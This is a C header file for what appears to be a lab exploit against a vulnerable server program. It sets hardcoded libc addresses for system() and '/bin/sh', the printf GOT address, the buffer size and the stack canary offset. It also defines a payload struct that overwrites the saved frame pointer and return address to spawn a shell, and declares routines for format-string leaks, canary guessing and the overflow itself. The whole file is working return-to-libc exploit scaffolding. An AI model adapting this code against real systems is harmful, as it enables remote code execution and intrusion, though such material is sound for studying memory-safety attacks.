#ifndef PAYLOAD_H
#define PAYLOAD_H

#ifdef NO_STACK_CANARIES
	// TARGET_BUF_SIZE should be determined by server.s
	#define TARGET_BUF_SIZE 1032
#else
	// 4 more bytes for a stack canary 
	#define TARGET_BUF_SIZE 1036
	#define CANARY_POSITION	1024
#endif

// 200 ms
#define TEST_INTERVAL_US	200000	
#define MAX_TIMES		10	
// The C library function addresses without ASLR
// We can get the following two addresses via gdb or lpr.c by [Solar Designer,1997]
// "/bin/sh"
#define SHELL_STR_ADDR	0xb7f80d98
// system()
#define SYSTEM_FUNC_ADDR	0xb7e5e430
// get it via escape_client and "objdump -R server"
#define PRINTF_FUNC_ADDR	0xb7e6bed0
#define PRINTF_GOT_ADDR		0x0804a004
//
#define	DUMMY_VALUE			0x41414141
// It depends on the victim function
#define	STACK_LIFTING_CNT	3

#define	BYTE_ESCAPE	"\\x%02x"

#define	STACK_LIFTING_STR	"%08x"

#define	MAX_GUESS_TIMES  32
#define	MAGIC_NUMBER		0x554E4A46

#define	WITHOUT_OUTPUT				0x00
#define	WITH_ESCAPE_OUTPUT		0x01
#define	WITH_NORMAL_OUTPUT		0x02



struct payload{
	char buf[TARGET_BUF_SIZE];
	unsigned int pre_ebp;
	unsigned int shell_entry;
	unsigned int fake_ret_addr;	
	unsigned int arg1;
	//unsigned int arg2;
	char padding[4];
};

struct server_info{
	unsigned int system_func_addr;
	unsigned int shell_str_addr;
	unsigned int printf_got_addr;
	unsigned int stack_lifting;	
	unsigned int canary;
};

void do_error(const char *msg, ...);
int get_and_prt(int sock,int debug);
int do_it(int argc, char **argv,void (*request)(int));
void print_bytes(char * ptr,int n);
void REPL(int sock,int debug);
void buffer_overflow(int sock,struct server_info * psi);
int in_place_escape(char * buf,int n);
int guess_stack_lifting(int sock);
void disclose_info(int sock, struct server_info * psi);
int gen_payload(char * buf, int size, char * prefix,unsigned int * addrs, unsigned int * vals,int av_cnt, int stack_cnt);

#endif


